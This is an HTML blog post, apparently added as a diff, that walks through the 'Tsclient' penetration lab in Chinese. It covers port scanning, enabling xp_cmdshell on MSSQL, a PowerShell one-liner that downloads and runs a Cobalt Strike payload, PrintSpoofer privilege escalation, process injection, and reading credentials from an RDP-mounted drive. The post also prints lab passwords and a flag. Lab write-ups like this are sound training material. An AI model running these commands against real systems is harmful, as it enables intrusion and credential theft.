@@ -1,0 +1,444 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Tsclient是一种在VPS上挂载本地磁盘的功能  外网打点 12fscan扫一扫.&#x2F;fscan.exe -h 39.98.123.74   Fscan默认不扫描3389，用Nmap端口扫描 123456nmap -T4 -A -v -Pn 39.98.123.7480&#x2F;tcp   open     http           Microsoft IIS httpd 10.01433">
+<meta property="og:type" content="article">
+<meta property="og:title" content="春秋云境-Tsclient">
+<meta property="og:url" content="http://example.com/2025/02/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/index.html">
+<meta property="og:site_name" content="Plazx">
+<meta property="og:description" content="Tsclient是一种在VPS上挂载本地磁盘的功能  外网打点 12fscan扫一扫.&#x2F;fscan.exe -h 39.98.123.74   Fscan默认不扫描3389，用Nmap端口扫描 123456nmap -T4 -A -v -Pn 39.98.123.7480&#x2F;tcp   open     http           Microsoft IIS httpd 10.01433">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/40918973/1737901048860-1dce4772-ed59-48cd-abe4-fc747ad6b7cf.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/40918973/1738941275907-ace9813e-5141-4b76-ba89-138cd0dc8e56.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/40918973/1738942590464-bf05e543-8473-4814-8397-b912a038f60c.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/40918973/1738943295561-8f9988e5-c881-4157-a2f0-8012c0e47648.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/40918973/1738944789059-8655865e-d360-4595-9496-a250d424ca47.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/40918973/1738944822176-29254de3-1e1e-4a79-b43f-c8a891193d7a.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/40918973/1739107519126-709e8a38-3020-47b6-ac79-202f66bb430e.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/40918973/1739107775218-a5dd6474-bba6-460a-8f4d-6987050170af.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/40918973/1739257087650-67e23e07-1f38-4a21-aab1-4e4c37bb03a1.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/40918973/1739110956933-b110db6e-dbbb-446e-a2c3-6beac4a09c2a.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/40918973/1739111163032-ed1f7bb5-570f-40ba-bdbf-83c6f711589f.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/40918973/1739112999888-f2390626-5b79-4a0d-9cc8-387eee5a7f65.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/40918973/1739869881421-8acf3eb0-e249-495e-a695-987a3c78f476.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/40918973/1739870350933-39c2cb90-7fae-474a-9874-ce8a1e5ae975.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/40918973/1739870829700-9e5e64b8-7a6a-47d3-98af-63861d832265.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/40918973/1739872954987-6effc537-83b8-413a-bc11-f7eeace4b0ac.png">
+<meta property="article:published_time" content="2025-02-17T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-02-18T12:54:36.846Z">
+<meta property="article:author" content="Plazx">
+<meta property="article:tag" content="春秋云境">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2025/png/40918973/1737901048860-1dce4772-ed59-48cd-abe4-fc747ad6b7cf.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>春秋云境-Tsclient</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/NekoSec">Projects</a></li><!--
+     --><!--
+       --><li><a href="/links/">Friend Links</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/02/15/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-ThermalPower/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/02/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/02/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/&text=春秋云境-Tsclient"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/02/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/&title=春秋云境-Tsclient"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/02/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/&is_video=false&description=春秋云境-Tsclient"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=春秋云境-Tsclient&body=Check out this article: http://example.com/2025/02/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/02/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/&title=春秋云境-Tsclient"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/02/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/&title=春秋云境-Tsclient"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/02/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/&title=春秋云境-Tsclient"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/02/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/&title=春秋云境-Tsclient"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/02/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/&name=春秋云境-Tsclient&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/02/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/&t=春秋云境-Tsclient"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#vJ2Py"><span class="toc-number">1.</span> <span class="toc-text">外网打点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SWMEH"><span class="toc-number">2.</span> <span class="toc-text">提权1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#osZai"><span class="toc-number">3.</span> <span class="toc-text">后渗透1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mEcTG"><span class="toc-number">4.</span> <span class="toc-text">内网信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#aEZQu"><span class="toc-number">5.</span> <span class="toc-text">代理搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#kju8P"><span class="toc-number">6.</span> <span class="toc-text">内网打点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sfuQk"><span class="toc-number">7.</span> <span class="toc-text">提权2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hir0S"><span class="toc-number">8.</span> <span class="toc-text">横向域控</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        春秋云境-Tsclient
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Plazx</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-02-17T16:00:00.000Z" class="dt-published" itemprop="datePublished">2025-02-18</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/" rel="tag">春秋云境</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <meta name="referrer" content="no-referrer" />
+
+
+
+<blockquote>
+<p>Tsclient是一种在VPS上挂载本地磁盘的功能</p>
+</blockquote>
+<h2 id="vJ2Py">外网打点</h2>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fscan扫一扫</span><br><span class="line">./fscan.exe -h <span class="number">39.98</span><span class="number">.123</span><span class="number">.74</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/40918973/1737901048860-1dce4772-ed59-48cd-abe4-fc747ad6b7cf.png"></p>
+<p><code>Fscan</code>默认不扫描3389，用<code>Nmap</code>端口扫描</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -A -v -Pn <span class="number">39.98</span><span class="number">.123</span><span class="number">.74</span></span><br><span class="line"></span><br><span class="line"><span class="number">80</span>/tcp   <span class="built_in">open</span>     http           Microsoft IIS httpd <span class="number">10.0</span></span><br><span class="line"><span class="number">1433</span>/tcp <span class="built_in">open</span>     ms-sql-s       Microsoft SQL Server <span class="number">2016</span> <span class="number">13.00</span><span class="number">.1601</span><span class="number">.00</span>; RTM</span><br><span class="line"><span class="number">2383</span>/tcp <span class="built_in">open</span>     ms-olap4?</span><br><span class="line"><span class="number">3389</span>/tcp <span class="built_in">open</span>     ms-wbt-server  Microsoft Terminal Services</span><br></pre></td></tr></table></figure>
+
+<p>登录进去<code>sqlserver</code>，第一时间想到<code>xp_cmdshell</code>光速拿下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">xp_cmdshell是sqlserver的一个用于执行命令的组件，一般只允许DBA使用</span><br><span class="line"></span><br><span class="line">SQL Server <span class="number">2005</span>之后的版本中，xp_cmdshell是默认关闭的，因此需要手动开启</span><br><span class="line">EXEC sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>,<span class="number">1</span>;RECONFIGURE; 开启xp_cmdshell是默认关闭的</span><br><span class="line"><span class="built_in">exec</span> master..xp_cmdshell <span class="string">&#x27;whoami&#x27;</span>; 执行命令</span><br></pre></td></tr></table></figure>
+
+<p>从网上找到一个数据库综合利用工具<code>MDUT</code></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/40918973/1738941275907-ace9813e-5141-4b76-ba89-138cd0dc8e56.png"></p>
+<p>下面进行Web投递上线CS（攻击-Web托管）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c <span class="string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://ip:80/a&#x27;))&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="SWMEH">提权1</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">whoami /priv</span><br><span class="line"></span><br><span class="line">特权信息</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">特权名                        描述                 状态  </span><br><span class="line">============================= ==================== ======</span><br><span class="line">SeAssignPrimaryTokenPrivilege 替换一个进程级令牌   已禁用</span><br><span class="line">SeIncreaseQuotaPrivilege      为进程调整内存配额   已禁用</span><br><span class="line">SeChangeNotifyPrivilege       绕过遍历检查         已启用</span><br><span class="line">SeImpersonatePrivilege        身份验证后模拟客户端 已启用</span><br><span class="line">SeCreateGlobalPrivilege       创建全局对象         已启用</span><br><span class="line">SeIncreaseWorkingSetPrivilege 增加进程工作集       已禁用</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>用梼杌插件的<code>PrintSpoofer</code>提权，虽然显示成功，但其实还是低权限的，可以从Github自己下了一个，通过MSSQL传送文件<a target="_blank" rel="noopener" href="https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0">Release PrintSpoofer · itm4n&#x2F;PrintSpoofer</a></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/40918973/1738942590464-bf05e543-8473-4814-8397-b912a038f60c.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">一定要上传到这里 C:/Users/Public</span><br><span class="line">shell C:/Users/Public/PrintSpoofer64.exe -i -c <span class="string">&quot;whoami&quot;</span></span><br><span class="line">再次转发STSTEM会话到CS，再次用web投递失败了，索性干拉EXE马</span><br><span class="line">shell C:/Users/Public/PrintSpoofer64.exe -i -c <span class="string">&quot;C:/Users/Public/artifact_x64.exe&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/40918973/1738943295561-8f9988e5-c881-4157-a2f0-8012c0e47648.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/40918973/1738944789059-8655865e-d360-4595-9496-a250d424ca47.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/40918973/1738944822176-29254de3-1e1e-4a79-b43f-c8a891193d7a.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag01: flag&#123;a08f14ae-b9ab-447a-9a73-68a463aa0f70&#125;</span><br></pre></td></tr></table></figure>
+
+<p>提示<code>user sessions</code></p>
+<h2 id="osZai">后渗透1</h2>
+正如开头所说`Tsclient`是一种在VPS上挂载本地磁盘的方法，在连接界面选择挂载，再次连接
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/40918973/1739107519126-709e8a38-3020-47b6-ac79-202f66bb430e.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/40918973/1739107775218-a5dd6474-bba6-460a-8f4d-6987050170af.png"></p>
+<p>进入<code>Tsclient</code>既可以访问用户的D盘，值得一提的是，一旦挂载一次，如果不主动取消，接下来连接所有的RDP都是挂载状态</p>
+<p>查看在线用户</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell quser || qwinst //查看在线用户的指令</span><br><span class="line">netstat -ano | findstr <span class="number">3389</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/40918973/1739257087650-67e23e07-1f38-4a21-aab1-4e4c37bb03a1.png"></p>
+<p>发现John是从31这台域机器上连接上来的</p>
+<p>查看进程列表</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/40918973/1739110956933-b110db6e-dbbb-446e-a2c3-6beac4a09c2a.png"></p>
+<p>进程注入：<code>Inject</code>注入<code>explorer.exe</code>（ Windows 的桌面进程  ）进程上线<code>John</code></p>
+<p>或者直接dump hash之后进行PTH也可以</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/40918973/1739111163032-ed1f7bb5-570f-40ba-bdbf-83c6f711589f.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net use 显示当前所有已连接的网络共享资源（如映射的驱动器、共享文件夹等）。</span><br><span class="line">shell <span class="built_in">dir</span> \\TSCLIENT\C</span><br><span class="line">shell <span class="built_in">type</span> <span class="string">&quot;\\TSCLIENT\C\credential.txt&quot;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">xiaorang.lab\Aldrich:Ald@rLMWuy7Z!<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">Do you know how to hijack Image?</span><br><span class="line">提示镜像劫持</span><br></pre></td></tr></table></figure>
+
+<h2 id="mEcTG">内网信息收集</h2>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Fscan C段走起</span><br><span class="line">shell C:/Users/Public/fscan.exe -h <span class="number">172.22</span><span class="number">.8</span><span class="number">.18</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\hacker\Desktop\fscan.exe -h <span class="number">172.22</span><span class="number">.8</span><span class="number">.18</span>/<span class="number">24</span></span><br><span class="line"></span><br><span class="line">[+] 目标 <span class="number">172.22</span><span class="number">.8</span><span class="number">.31</span>     存活 (ICMP)</span><br><span class="line">[+] 目标 <span class="number">172.22</span><span class="number">.8</span><span class="number">.18</span>     存活 (ICMP)</span><br><span class="line">[+] 目标 <span class="number">172.22</span><span class="number">.8</span><span class="number">.15</span>     存活 (ICMP)</span><br><span class="line">[+] 目标 <span class="number">172.22</span><span class="number">.8</span><span class="number">.46</span>     存活 (ICMP)</span><br><span class="line">[+] ICMP存活主机数量: <span class="number">4</span></span><br><span class="line">[*] 共解析 <span class="number">218</span> 个有效端口</span><br><span class="line">[+] 端口开放 <span class="number">172.22</span><span class="number">.8</span><span class="number">.18</span>:<span class="number">1433</span></span><br><span class="line">[+] 端口开放 <span class="number">172.22</span><span class="number">.8</span><span class="number">.18</span>:<span class="number">445</span></span><br><span class="line">[+] 端口开放 <span class="number">172.22</span><span class="number">.8</span><span class="number">.18</span>:<span class="number">139</span></span><br><span class="line">[+] 端口开放 <span class="number">172.22</span><span class="number">.8</span><span class="number">.46</span>:<span class="number">445</span></span><br><span class="line">[+] 端口开放 <span class="number">172.22</span><span class="number">.8</span><span class="number">.15</span>:<span class="number">445</span></span><br><span class="line">[+] 端口开放 <span class="number">172.22</span><span class="number">.8</span><span class="number">.31</span>:<span class="number">445</span></span><br><span class="line">[+] 端口开放 <span class="number">172.22</span><span class="number">.8</span><span class="number">.46</span>:<span class="number">139</span></span><br><span class="line">[+] 端口开放 <span class="number">172.22</span><span class="number">.8</span><span class="number">.15</span>:<span class="number">139</span></span><br><span class="line">[+] 端口开放 <span class="number">172.22</span><span class="number">.8</span><span class="number">.31</span>:<span class="number">139</span></span><br><span class="line">[+] 端口开放 <span class="number">172.22</span><span class="number">.8</span><span class="number">.46</span>:<span class="number">135</span></span><br><span class="line">[+] 端口开放 <span class="number">172.22</span><span class="number">.8</span><span class="number">.15</span>:<span class="number">135</span></span><br><span class="line">[+] 端口开放 <span class="number">172.22</span><span class="number">.8</span><span class="number">.31</span>:<span class="number">135</span></span><br><span class="line">[+] 端口开放 <span class="number">172.22</span><span class="number">.8</span><span class="number">.18</span>:<span class="number">135</span></span><br><span class="line">[+] 端口开放 <span class="number">172.22</span><span class="number">.8</span><span class="number">.15</span>:<span class="number">88</span></span><br><span class="line">[+] 端口开放 <span class="number">172.22</span><span class="number">.8</span><span class="number">.46</span>:<span class="number">80</span></span><br><span class="line">[+] 端口开放 <span class="number">172.22</span><span class="number">.8</span><span class="number">.18</span>:<span class="number">80</span></span><br><span class="line">[+] 存活端口数量: <span class="number">16</span></span><br><span class="line">[*] 开始漏洞扫描...</span><br><span class="line">[!] 扫描错误 <span class="number">172.22</span><span class="number">.8</span><span class="number">.15</span>:<span class="number">445</span> - read tcp <span class="number">172.22</span><span class="number">.8</span><span class="number">.18</span>:<span class="number">51265</span>-&gt;<span class="number">172.22</span><span class="number">.8</span><span class="number">.15</span>:<span class="number">445</span>: wsarecv: An existing connection was forcibly closed by the remote host.</span><br><span class="line">[!] 扫描错误 <span class="number">172.22</span><span class="number">.8</span><span class="number">.31</span>:<span class="number">445</span> - read tcp <span class="number">172.22</span><span class="number">.8</span><span class="number">.18</span>:<span class="number">51266</span>-&gt;<span class="number">172.22</span><span class="number">.8</span><span class="number">.31</span>:<span class="number">445</span>: wsarecv: An existing connection was forcibly closed by the remote host.</span><br><span class="line">[!] 扫描错误 <span class="number">172.22</span><span class="number">.8</span><span class="number">.46</span>:<span class="number">445</span> - 无法确定目标是否存在漏洞</span><br><span class="line">[*] NetInfo</span><br><span class="line">[*] <span class="number">172.22</span><span class="number">.8</span><span class="number">.46</span></span><br><span class="line">   [-&gt;] WIN2016</span><br><span class="line">   [-&gt;] <span class="number">172.22</span><span class="number">.8</span><span class="number">.46</span></span><br><span class="line">[!] 扫描错误 <span class="number">172.22</span><span class="number">.8</span><span class="number">.18</span>:<span class="number">445</span> - 无法确定目标是否存在漏洞</span><br><span class="line">[!] 扫描错误 <span class="number">172.22</span><span class="number">.8</span><span class="number">.15</span>:<span class="number">88</span> - Get <span class="string">&quot;http://172.22.8.15:88&quot;</span>: read tcp <span class="number">172.22</span><span class="number">.8</span><span class="number">.18</span>:<span class="number">51275</span>-&gt;<span class="number">172.22</span><span class="number">.8</span><span class="number">.15</span>:<span class="number">88</span>: wsarecv: An existing connection was forcibly closed by the remote host.</span><br><span class="line">[*] NetInfo</span><br><span class="line">[*] <span class="number">172.22</span><span class="number">.8</span><span class="number">.18</span></span><br><span class="line">   [-&gt;] WIN-WEB</span><br><span class="line">   [-&gt;] <span class="number">172.22</span><span class="number">.8</span><span class="number">.18</span></span><br><span class="line">   [-&gt;] <span class="number">2001</span>:<span class="number">0</span>:348b:fb58:8a2:<span class="number">1274</span>:d89c:6f2c</span><br><span class="line">[*] NetInfo</span><br><span class="line">[*] <span class="number">172.22</span><span class="number">.8</span><span class="number">.31</span></span><br><span class="line">   [-&gt;] WIN19-CLIENT</span><br><span class="line">   [-&gt;] <span class="number">172.22</span><span class="number">.8</span><span class="number">.31</span></span><br><span class="line">[*] NetBios <span class="number">172.22</span><span class="number">.8</span><span class="number">.15</span>     [+] DC:XIAORANG\DC01</span><br><span class="line">[*] NetBios <span class="number">172.22</span><span class="number">.8</span><span class="number">.31</span>     XIAORANG\WIN19-CLIENT</span><br><span class="line">[*] NetInfo</span><br><span class="line">[*] <span class="number">172.22</span><span class="number">.8</span><span class="number">.15</span></span><br><span class="line">   [-&gt;] DC01</span><br><span class="line">   [-&gt;] <span class="number">172.22</span><span class="number">.8</span><span class="number">.15</span></span><br><span class="line">[*] NetBios <span class="number">172.22</span><span class="number">.8</span><span class="number">.46</span>     WIN2016.xiaorang.lab                Windows Server <span class="number">2016</span> Datacenter <span class="number">14393</span></span><br><span class="line">[*] 网站标题 http://<span class="number">172.22</span><span class="number">.8</span><span class="number">.18</span>        状态码:<span class="number">200</span> 长度:<span class="number">703</span>    标题:IIS Windows Server</span><br><span class="line">[*] 网站标题 http://<span class="number">172.22</span><span class="number">.8</span><span class="number">.46</span>        状态码:<span class="number">200</span> 长度:<span class="number">703</span>    标题:IIS Windows Server</span><br><span class="line">[!] 扫描错误 <span class="number">172.22</span><span class="number">.8</span><span class="number">.18</span>:<span class="number">139</span> - netbios error</span><br><span class="line">[+] MSSQL <span class="number">172.22</span><span class="number">.8</span><span class="number">.18</span>:<span class="number">1433</span>:sa 1qaz!QAZ</span><br><span class="line">[+] 扫描已完成: <span class="number">16</span>/<span class="number">16</span></span><br><span class="line">[*] 扫描结束,耗时: <span class="number">13.1589705</span>s</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/40918973/1739112999888-f2390626-5b79-4a0d-9cc8-387eee5a7f65.png"></p>
+<p>第一次报出来一堆古文韩文日文，原因是用<code>GBK</code>读取<code>UTF-8</code>的内容，<a target="_blank" rel="noopener" href="http://www.mytju.com/classCode/tools/messyCodeRecover.asp">乱码恢复</a>恢复一下就好了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">172.22</span><span class="number">.8</span><span class="number">.18</span>  目前这台，非域机器，已拿下</span><br><span class="line"><span class="number">172.22</span><span class="number">.8</span><span class="number">.15</span>  域控 </span><br><span class="line"><span class="number">172.22</span><span class="number">.8</span><span class="number">.31</span>  域机器</span><br><span class="line"><span class="number">172.22</span><span class="number">.8</span><span class="number">.46</span>  域机器</span><br></pre></td></tr></table></figure>
+
+<h2 id="aEZQu">代理搭建</h2>
+还是用`Snowaway`
+
